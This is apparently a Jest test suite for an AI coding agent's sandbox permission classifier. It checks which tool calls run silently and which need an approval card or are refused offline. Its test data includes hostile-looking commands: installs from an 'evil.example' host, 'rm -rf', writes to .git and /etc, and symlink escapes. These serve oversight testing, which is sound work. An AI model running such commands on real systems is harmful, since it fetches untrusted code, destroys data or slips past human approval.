import { mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import os, { tmpdir } from 'node:os';
import { join } from 'node:path';
import { recordClassificationAudit, type AuditRecordInput } from '../../../src/core/permissions/audit';
import { classifyTier, type ClassifyContext, type SentinelAction } from '../../../src/core/permissions/classifier';
import {
  defaultSentinelServices,
  forUnattendedRun,
  withoutRelaxations,
  type SentinelServices,
} from '../../../src/core/permissions/context';
import { verifyPreDispatch } from '../../../src/core/permissions/dispatch';
import type { TrackedExecutableScope } from '../../../src/core/permissions/trackedExecutables';
import { createWebSearchTurnState } from '../../../src/core/permissions/webSearch';

/** Services where the owner's "run code in the sandbox without asking" switch is on or off. */
function servicesWith({
  sandbox_without_asking,
  offline = false,
}: {
  sandbox_without_asking: boolean;
  offline?: boolean;
}): SentinelServices {
  const services = defaultSentinelServices({ pinned_path: '/usr/bin:/bin' });
  services.sandboxWithoutAsking = () => Promise.resolve(sandbox_without_asking);
  services.isOffline = () => Promise.resolve(offline);
  return services;
}

/** The context of a call from a sandbox. By default the sandbox has no network, as the installed one does. */
function makeCtx({
  services,
  workspace,
  network = 'none',
}: {
  services: SentinelServices;
  workspace: string | null;
  network?: 'none' | 'reachable';
}): ClassifyContext {
  return {
    services,
    sandbox_network: network === 'none' ? 'none' : undefined,
    tenant_id: 't1',
    created_by: 'u1',
    conversation_id: 'conv-1',
    repository_id: null,
    workspace_cwd: workspace,
    agent_intent: 'make a small script',
    web_search: createWebSearchTurnState(),
  };
}

/** The scope a classifier call for `workspace` in conversation `conv-1` reads from the tracked set. */
function trackedScope(workspace: string): TrackedExecutableScope {
  return {
    tenant_id: 't1',
    created_by: 'u1',
    conversation_id: 'conv-1',
    repository_id: null,
    workspace_cwd: workspace,
  };
}

/**
 * Writes a script into the workspace. `authored` records it the way the sandbox does for a file the
 * agent's own file tools wrote in this conversation; otherwise it stands for a repo, downloaded or unknown file.
 */
function writeScript({
  services,
  workspace,
  name,
  authored,
  content = 'print(1)\n',
}: {
  services: SentinelServices;
  workspace: string;
  name: string;
  authored: boolean;
  content?: string;
}): void {
  const file = join(workspace, name);
  writeFileSync(file, content);
  if (authored) {
    services.tracked_store.track({ scope: trackedScope(workspace), file_identity: realpathSync(file) });
  }
}

function action(tool_name: string, canonical_params: Record<string, unknown>): SentinelAction {
  return { tool_name, canonical_params, tool_type: 'truefoundry-system', mcp_hints: {} };
}

/** Runs a test in a fresh workspace, with an empty home folder so the machine's own hook files cannot leak in. */
function withWorkspace(run: (workspace: string) => Promise<void>): () => Promise<void> {
  return async () => {
    const workspace = mkdtempSync(join(tmpdir(), 'sandbox-no-cards-'));
    const home = mkdtempSync(join(tmpdir(), 'sandbox-home-'));
    const homedir = jest.spyOn(os, 'homedir').mockReturnValue(home);
    try {
      await run(workspace);
    } finally {
      homedir.mockRestore();
      rmSync(workspace, { recursive: true, force: true });
      rmSync(home, { recursive: true, force: true });
    }
  };
}

describe('in-sandbox work with the switch on runs without a card', () => {
  test(
    'a file write in the workspace is Tier 1 with its own reason',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_file_write');
      expect(decision.card).toBeNull();
      expect(decision.approval_token_id).toBeNull();
    }),
  );

  test(
    'run_code is Tier 1 with its own reason',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)', language: 'python' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_run_code');
      expect(decision.card).toBeNull();
    }),
  );
});

describe('a scheduled run asks before in-sandbox work, with the switch on', () => {
  function scheduledRun(workspace: string, services = servicesWith({ sandbox_without_asking: true })): ClassifyContext {
    return makeCtx({ services: forUnattendedRun(services), workspace });
  }

  test(
    'inline code asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)', language: 'python' }),
        scheduledRun(workspace),
      );
      expect(decision.tier).toBe(3);
      expect(decision.auto_deny).toBeNull();
      expect(decision.card).not.toBeNull();
    }),
  );

  test(
    'a new file in the workspace asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'notes.py'), content: 'print(1)' }),
        scheduledRun(workspace),
      );
      expect(decision.tier).not.toBe(1);
      expect(decision.reason).not.toBe('sandbox_file_write');
      expect(decision.auto_deny).toBeNull();
    }),
  );

  test(
    'a script Aman wrote in the same chat asks, by exec and by run_code',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'agent_tool.py', authored: true });
      const byExec = await classifyTier(
        action('exec', { command: 'python3 agent_tool.py', cwd: workspace }),
        scheduledRun(workspace, services),
      );
      const byRunCode = await classifyTier(
        action('run_code', { script_path: join(workspace, 'agent_tool.py'), language: 'python' }),
        scheduledRun(workspace, services),
      );
      expect(byExec.tier).toBe(3);
      expect(byExec.auto_deny).toBeNull();
      expect(byRunCode.tier).toBe(3);
      expect(byRunCode.auto_deny).toBeNull();
    }),
  );

  test(
    'a package install asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'npm install --ignore-scripts humanize', cwd: workspace }),
        scheduledRun(workspace),
      );
      expect(decision.tier).toBe(3);
      expect(decision.reason).not.toBe('sandbox_package_install');
      expect(decision.auto_deny).toBeNull();
    }),
  );

  test(
    'a command that only reads the workspace still runs without a card',
    withWorkspace(async workspace => {
      const decision = await classifyTier(action('exec', { command: 'ls', cwd: workspace }), scheduledRun(workspace));
      expect(decision.tier).toBe(1);
    }),
  );
});

describe("a turn the person types in a scheduled run's chat asks before in-sandbox work, with the switch on", () => {
  function typedTurn(workspace: string): ClassifyContext {
    return makeCtx({ services: withoutRelaxations(servicesWith({ sandbox_without_asking: true })), workspace });
  }

  test(
    'inline code asks with a card to answer',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)', language: 'python' }),
        typedTurn(workspace),
      );
      expect(decision.tier).toBe(3);
      expect(decision.auto_deny).toBeNull();
      expect(decision.card).not.toBeNull();
      expect(decision.approval_token_id).not.toBeNull();
    }),
  );

  test(
    'a new file in the workspace asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'notes.py'), content: 'print(1)' }),
        typedTurn(workspace),
      );
      expect(decision.tier).not.toBe(1);
      expect(decision.reason).not.toBe('sandbox_file_write');
      expect(decision.auto_deny).toBeNull();
    }),
  );

  test(
    'a command that only reads the workspace still runs without a card',
    withWorkspace(async workspace => {
      const decision = await classifyTier(action('exec', { command: 'ls', cwd: workspace }), typedTurn(workspace));
      expect(decision.tier).toBe(1);
    }),
  );
});

describe('a package install always asks', () => {
  test.each([
    ['a pip install', 'pip install humanize', null],
    ['a pip3 install', 'pip3 install humanize', null],
    ['a python -m pip install', 'python3 -m pip install humanize', null],
    ['a uv pip install', 'uv pip install humanize', null],
    ['a poetry install', 'poetry install', null],
    ['an npm install', 'npm install humanize', null],
    ['an npm install that runs no install scripts', 'npm install --ignore-scripts humanize', null],
    ['a pnpm add that runs no install scripts', 'pnpm add --ignore-scripts humanize', 'pnpm@11.16.0'],
    ['a yarn add that runs no install scripts', 'yarn add --ignore-scripts humanize', 'yarn@4.5.0'],
  ])('%s asks with the switch on', (_label, command, declared) =>
    withWorkspace(async workspace => {
      if (declared !== null) {
        writeFileSync(join(workspace, 'package.json'), JSON.stringify({ packageManager: declared }));
      }
      const decision = await classifyTier(
        action('exec', { command, cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card).not.toBeNull();
      expect(decision.auto_deny).toBeNull();
    })(),
  );

  test(
    'an install asks with the switch off',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'npm install --ignore-scripts humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );
});

describe('on a sandbox that can reach a network, in-sandbox work asks with the switch on', () => {
  test(
    'inline code asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)', language: 'python' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace, network: 'reachable' }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card).not.toBeNull();
    }),
  );

  test(
    'a new file in the workspace asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace, network: 'reachable' }),
      );
      expect(decision.tier).toBe(2);
      expect(decision.reason).not.toBe('sandbox_file_write');
    }),
  );

  test(
    'a script Aman wrote in this chat asks, by exec and by run_code',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'agent_tool.py', authored: true });
      const byExec = await classifyTier(
        action('exec', { command: 'python3 agent_tool.py', cwd: workspace }),
        makeCtx({ services, workspace, network: 'reachable' }),
      );
      const byRunCode = await classifyTier(
        action('run_code', { script_path: join(workspace, 'agent_tool.py'), language: 'python' }),
        makeCtx({ services, workspace, network: 'reachable' }),
      );
      expect(byExec.tier).toBe(3);
      expect(byRunCode.tier).toBe(3);
    }),
  );

  test(
    'a command that only reads the workspace still runs without a card',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'ls', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace, network: 'reachable' }),
      );
      expect(decision.tier).toBe(1);
    }),
  );
});

/** Runs that are silent only when the script they run is one Aman wrote in this conversation. */
const AUTHORED_SILENT_RUNS: readonly { command: string; file: string }[] = [
  { command: 'python3 agent_tool.py', file: 'agent_tool.py' },
  { command: 'python3 -u agent_tool.py --flag', file: 'agent_tool.py' },
  { command: 'node agent_tool.js', file: 'agent_tool.js' },
];

/** Runs that keep their card even when the switch is on: a script from outside Aman's conversation, or no script at all. */
const CARDED_RUNS: readonly { command: string; file: string | null }[] = [
  { command: 'python3 repo_tool.py', file: 'repo_tool.py' },
  { command: 'bash repo_tool.sh', file: 'repo_tool.sh' },
  { command: 'bash agent_tool.sh', file: 'agent_tool.sh' },
  { command: 'node repo_tool.js', file: 'repo_tool.js' },
  { command: 'sh -c "./repo_tool.sh"', file: 'repo_tool.sh' },
  { command: 'sh -c "./agent_tool.sh"', file: 'agent_tool.sh' },
  { command: 'python3 -m agent_tool', file: 'agent_tool.py' },
  { command: 'pytest -q', file: null },
  { command: 'python3 -m pytest -q', file: null },
  { command: 'npm test', file: null },
  { command: 'python3 -', file: null },
];

describe('a script runs silently only when Aman wrote it in this conversation', () => {
  test.each(AUTHORED_SILENT_RUNS)('$command runs without a card when Aman wrote the script', ({ command, file }) =>
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: file, authored: true });
      const decision = await classifyTier(
        action('exec', { command, cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_command');
      expect(decision.card).toBeNull();
    })(),
  );

  test.each(CARDED_RUNS)('$command keeps its card with the switch on', ({ command, file }) =>
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      if (file !== null) {
        writeScript({ services, workspace, name: file, authored: command.includes('agent_tool') });
      }
      const decision = await classifyTier(
        action('exec', { command, cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card).not.toBeNull();
    })(),
  );

  test.each([...AUTHORED_SILENT_RUNS, ...CARDED_RUNS])(
    '$command keeps its card with the switch off',
    ({ command, file }) =>
      withWorkspace(async workspace => {
        const services = servicesWith({ sandbox_without_asking: false });
        if (file !== null) {
          writeScript({ services, workspace, name: file, authored: true });
        }
        const decision = await classifyTier(
          action('exec', { command, cwd: workspace }),
          makeCtx({ services, workspace }),
        );
        expect(decision.tier).toBe(3);
        expect(decision.card).not.toBeNull();
      })(),
  );
});

describe('a write to a file Aman did not create keeps its card', () => {
  test(
    'writing a file that already exists in the workspace asks',
    withWorkspace(async workspace => {
      writeFileSync(join(workspace, 'README.md'), 'repo text');
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'README.md'), content: 'changed' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(2);
      expect(decision.card).not.toBeNull();
    }),
  );

  test(
    'a new file in the workspace still runs without a card',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'brand_new.py'), content: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_file_write');
    }),
  );

  test(
    'a file Aman created earlier in the conversation runs without a card',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'notes.py', authored: true });
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'notes.py'), content: 'print(2)' }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.card).toBeNull();
    }),
  );
});

describe('a script that loads other code keeps its card, even when Aman wrote it', () => {
  test(
    'a python3 script importing a repo module asks',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'repo_helper.py', authored: false, content: 'x = 1\n' });
      writeScript({ services, workspace, name: 'agent_main.py', authored: true, content: 'import repo_helper\n' });
      const decision = await classifyTier(
        action('exec', { command: 'python3 agent_main.py', cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card).not.toBeNull();
    }),
  );

  test(
    'a node script requiring a repo module asks',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'repo_helper.js', authored: false, content: 'module.exports = 1;\n' });
      writeScript({
        services,
        workspace,
        name: 'agent_main.js',
        authored: true,
        content: "const h = require('./repo_helper.js');\nconsole.log(h);\n",
      });
      const decision = await classifyTier(
        action('exec', { command: 'node agent_main.js', cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card).not.toBeNull();
    }),
  );

  test.each([
    ['a python3 script that uses importlib', 'agent_main.py', 'import importlib\nimportlib.import_module("x")\n'],
    ['a python3 script that starts a program', 'agent_main.py', 'import subprocess\nsubprocess.run(["ls"])\n'],
    ['a node script that starts a program', 'agent_main.js', "require('child_process').execSync('ls');\n"],
    ['a node script with a dynamic require', 'agent_main.js', 'const m = process.argv[2];\nrequire(m);\n'],
  ])('%s asks', (_label, name, content) =>
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name, authored: true, content });
      const command = name.endsWith('.js') ? `node ${name}` : `python3 ${name}`;
      const decision = await classifyTier(
        action('exec', { command, cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card).not.toBeNull();
    })(),
  );

  test(
    'a python3 script that imports only the standard library runs without a card',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'agent_main.py', authored: true, content: 'import json, os.path\n' });
      const decision = await classifyTier(
        action('exec', { command: 'python3 agent_main.py', cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_command');
    }),
  );

  test(
    'a node script that requires only built-in modules runs without a card',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({
        services,
        workspace,
        name: 'agent_main.js',
        authored: true,
        content: "const fs = require('node:fs');\nconsole.log(fs.existsSync('.'));\n",
      });
      const decision = await classifyTier(
        action('exec', { command: 'node agent_main.js', cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_command');
    }),
  );
});

describe('the same in-sandbox work asks with the switch off', () => {
  test(
    'run_code asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );

  test(
    'a file write asks in a card (Tier 2)',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(2);
    }),
  );

  test(
    'python3 on a script the agent wrote asks',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: false });
      writeScript({ services, workspace, name: 'humanize_demo.py', authored: true });
      const decision = await classifyTier(
        action('exec', { command: 'python3 humanize_demo.py', cwd: workspace }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );

  test(
    'pip install asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'pip install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );
});

describe('actions that leave the sandbox still ask, with the switch on', () => {
  test.each([
    ['curl over the network', 'exec', { command: 'curl https://example.com' }],
    ['git push', 'exec', { command: 'git push origin main' }],
    ['a wget download', 'exec', { command: 'wget https://example.com/x.tar.gz' }],
    ['a pip install from a web address', 'exec', { command: 'pip install https://evil.example/pkg.tar.gz' }],
    ['a pip install from a requirements file', 'exec', { command: 'pip install -r requirements.txt' }],
    ['an npm install from a git address', 'exec', { command: 'npm install git+https://example.com/pkg.git' }],
    ['an npm install with no package named', 'exec', { command: 'npm install' }],
    ['inline Python code', 'exec', { command: 'python3 -c "print(1)"' }],
    ['inline Node code', 'exec', { command: 'node -e "console.log(1)"' }],
    ['inline Python code read from stdin', 'exec', { command: 'python3 -' }],
    [
      'a pip install from an index URL',
      'exec',
      { command: 'pip install --index-url https://evil.example/simple humanize' },
    ],
    [
      'a pip install from an extra index URL',
      'exec',
      { command: 'pip3 install --extra-index-url https://evil.example/simple humanize' },
    ],
    [
      'a python -m pip install from an index URL',
      'exec',
      { command: 'python3 -m pip install --index-url https://evil.example/simple humanize' },
    ],
    [
      'a python -m pip install from a web address',
      'exec',
      { command: 'python3 -m pip install https://evil.example/pkg.tar.gz' },
    ],
    ['a python -m pip install from a path', 'exec', { command: 'python3 -m pip install ./vendor/pkg' }],
    ['a delete', 'exec', { command: 'rm -rf build' }],
    ['a model-supplied environment', 'exec', { command: 'python3 humanize_demo.py', env: { PYTHONPATH: '/tmp' } }],
    ['a write to .git', 'write_file', { path: '.git/config', content: 'x' }],
    ['a write outside the workspace', 'write_file', { path: '/etc/hosts.demo', content: 'x' }],
    ['a write into a sandbox tool folder', 'write_file', { path: '.venv/bin/evil', content: 'x' }],
  ])('asks for %s', (_label, tool_name, params) =>
    withWorkspace(async workspace => {
      const canonical = tool_name === 'exec' ? { cwd: workspace, ...params } : params;
      const decision = await classifyTier(
        action(tool_name, canonical),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).not.toBe(1);
      expect(decision.auto_deny).toBeNull();
    })(),
  );

  test(
    'a script run from outside the workspace asks',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'demo.py', authored: true });
      const decision = await classifyTier(
        action('exec', { command: `python3 ${join(workspace, 'demo.py')}`, cwd: '/' }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.reason).toBe('cwd_outside_workspace');
    }),
  );

  test(
    'an unplaceable command asks when there is no workspace',
    withWorkspace(async () => {
      const decision = await classifyTier(
        action('exec', { command: 'python3 demo.py' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace: null }),
      );
      expect(decision.tier).toBe(3);
    }),
  );
});

describe('offline mode refuses package installs before any card', () => {
  test(
    'python -m pip install is refused with the same plain line',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'python3 -m pip install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true, offline: true }), workspace }),
      );
      expect(decision.auto_deny).toBe('offline_mode');
      expect(decision.card).toBeNull();
      expect(decision.reason_detail).toBe('Installing packages needs downloads, which are off while offline.');
    }),
  );

  test(
    'pip install is refused with one plain line',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'pip install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true, offline: true }), workspace }),
      );
      expect(decision.auto_deny).toBe('offline_mode');
      expect(decision.card).toBeNull();
      expect(decision.reason_detail).toBe('Installing packages needs downloads, which are off while offline.');
    }),
  );

  test(
    'npm install is refused with the same plain line',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('exec', { command: 'npm install humanize', cwd: workspace }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false, offline: true }), workspace }),
      );
      expect(decision.auto_deny).toBe('offline_mode');
      expect(decision.card).toBeNull();
    }),
  );
});

describe('a write through a symlink is checked where it lands', () => {
  /** A file outside the workspace that a link inside the workspace can point at. */
  function withOutside(run: (outside: string) => Promise<void>): () => Promise<void> {
    return async () => {
      const outside = mkdtempSync(join(tmpdir(), 'sandbox-outside-'));
      try {
        await run(outside);
      } finally {
        rmSync(outside, { recursive: true, force: true });
      }
    };
  }

  test(
    'a link whose final component points outside the workspace asks',
    withWorkspace(async workspace =>
      withOutside(async outside => {
        writeFileSync(join(outside, 'secret.txt'), 'kept');
        symlinkSync(join(outside, 'secret.txt'), join(workspace, 'link.txt'));
        const decision = await classifyTier(
          action('write_file', { path: join(workspace, 'link.txt'), content: 'changed' }),
          makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
        );
        expect(decision.tier).toBe(3);
        expect(decision.reason).toBe('write_outside_workspace');
      })(),
    ),
  );

  test(
    'a dangling link that leads outside the workspace asks',
    withWorkspace(async workspace =>
      withOutside(async outside => {
        symlinkSync(join(outside, 'not-yet.txt'), join(workspace, 'dangling.txt'));
        const decision = await classifyTier(
          action('write_file', { path: join(workspace, 'dangling.txt'), content: 'new' }),
          makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
        );
        expect(decision.tier).toBe(3);
        expect(decision.reason).toBe('write_outside_workspace');
      })(),
    ),
  );

  test(
    'a link that stays inside the workspace still runs without a card',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'target.txt', authored: true });
      symlinkSync(join(workspace, 'target.txt'), join(workspace, 'inside.txt'));
      const decision = await classifyTier(
        action('write_file', { path: join(workspace, 'inside.txt'), content: 'changed' }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_file_write');
    }),
  );

  test(
    'a silent write re-checks its containment at dispatch and fails when the link is repointed outside',
    withWorkspace(async workspace =>
      withOutside(async outside => {
        const path = join(workspace, 'note.txt');
        const services = servicesWith({ sandbox_without_asking: true });
        writeScript({ services, workspace, name: 'note.txt', authored: true });
        const ctx = makeCtx({ services, workspace });
        const params = { path, content: 'second' };
        const decision = await classifyTier(action('write_file', params), ctx);
        expect(decision.tier).toBe(1);

        rmSync(path);
        writeFileSync(join(outside, 'secret.txt'), 'kept');
        symlinkSync(join(outside, 'secret.txt'), path);
        const error = await verifyPreDispatch({
          call: {
            tool_name: 'write_file',
            tool_type: 'truefoundry-system',
            canonical_params: params,
            tier: 1,
            approval_token_id: null,
            approval_binding: null,
            shell_binding: null,
          },
          ctx: { ...ctx, offline: false },
        });
        expect(error).toBeDefined();
      })(),
    ),
  );
});

describe('run_code runs silently only for code Aman wrote in this chat', () => {
  test.each([
    ['inline code that imports a package', { code: 'import requests\n', language: 'python' }],
    ['inline code that starts a program', { code: 'import subprocess\n', language: 'python' }],
    ['inline code that names no language', { code: 'print(1)' }],
    ['a call with both code and script_path', { code: 'print(1)', script_path: 'x.py', language: 'python' }],
  ])('%s keeps its card', (_label, params) =>
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', params),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(3);
    })(),
  );

  test(
    'a script_path Aman did not write keeps its card, even when the script is plain standard code',
    withWorkspace(async workspace => {
      writeScript({
        services: servicesWith({ sandbox_without_asking: true }),
        workspace,
        name: 'repo_tool.py',
        authored: false,
      });
      const decision = await classifyTier(
        action('run_code', { script_path: join(workspace, 'repo_tool.py'), language: 'python' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );

  test(
    'a script_path Aman wrote this session runs silently',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      writeScript({ services, workspace, name: 'agent_tool.py', authored: true });
      const decision = await classifyTier(
        action('run_code', { script_path: join(workspace, 'agent_tool.py'), language: 'python' }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(1);
      expect(decision.reason).toBe('sandbox_run_code');
    }),
  );

  test(
    'run_code keeps its card in a workspace whose hook files would turn install scripts on',
    withWorkspace(async workspace => {
      writeFileSync(join(workspace, '.npmrc'), 'ignore-scripts=false\n');
      const decision = await classifyTier(
        action('run_code', { code: 'print(1)', language: 'python' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
      );
      expect(decision.tier).toBe(3);
    }),
  );

  test(
    'run_code and write_file ask with the switch off',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: false });
      const run = await classifyTier(
        action('run_code', { code: 'print(1)', language: 'python' }),
        makeCtx({ services, workspace }),
      );
      const write = await classifyTier(
        action('write_file', { path: join(workspace, 'new.py'), content: 'print(1)' }),
        makeCtx({ services, workspace }),
      );
      expect(run.tier).toBe(3);
      expect(write.tier).not.toBe(1);
    }),
  );
});

describe('the run_code approval card shows the code it would run', () => {
  test(
    'inline code is on the card',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { code: 'print("hello")\n', language: 'python' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card?.parsed_command).toBe('print("hello")\n');
    }),
  );

  test(
    'a script file the call names is on the card as its text',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: false });
      writeScript({ services, workspace, name: 'report.py', authored: false, content: 'print("from file")\n' });
      const decision = await classifyTier(
        action('run_code', { script_path: join(workspace, 'report.py'), language: 'python' }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card?.parsed_command).toBe('print("from file")\n');
    }),
  );

  test(
    'a script file that cannot be read leaves the card without code, and the card still asks',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { script_path: join(workspace, 'missing.py'), language: 'python' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card?.parsed_command).toBeNull();
    }),
  );

  test(
    'a script file over the checked-script bound leaves the card without code',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: false });
      writeScript({ services, workspace, name: 'big.py', authored: false, content: `# ${'x'.repeat(300 * 1024)}\n` });
      const decision = await classifyTier(
        action('run_code', { script_path: join(workspace, 'big.py'), language: 'python' }),
        makeCtx({ services, workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card?.parsed_command).toBeNull();
    }),
  );

  test(
    'a call that names no source leaves the card without code',
    withWorkspace(async workspace => {
      const decision = await classifyTier(
        action('run_code', { language: 'python' }),
        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
      );
      expect(decision.tier).toBe(3);
      expect(decision.card?.parsed_command).toBeNull();
    }),
  );
});

describe('run_code and write_file in the sandbox appear in the activity list', () => {
  test(
    'a silent write and a silent run are both recorded as logged',
    withWorkspace(async workspace => {
      const services = servicesWith({ sandbox_without_asking: true });
      const written: AuditRecordInput[] = [];
      services.audit = {
        record: input => {
          written.push(input);
          return Promise.resolve();
        },
      };
      const ctx = makeCtx({ services, workspace });
      const calls: { tool_name: string; params: Record<string, unknown> }[] = [
        { tool_name: 'write_file', params: { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' } },
        { tool_name: 'run_code', params: { code: 'print(1)', language: 'python' } },
      ];
      for (const { tool_name, params } of calls) {
        const decision = await classifyTier(action(tool_name, params), ctx);
        await recordClassificationAudit({
          services,
          identity: {
            tenant_id: 't1',
            created_by: 'u1',
            conversation_id: 'conv-1',
            repository_id: null,
            workspace_cwd: workspace,
            agent_intent: null,
          },
          tool_name,
          decision,
        });
      }
      expect(written).toEqual([
        expect.objectContaining({ tool_name: 'write_file', outcome: 'logged' }),
        expect.objectContaining({ tool_name: 'run_code', outcome: 'logged' }),
      ]);
    }),
  );
});
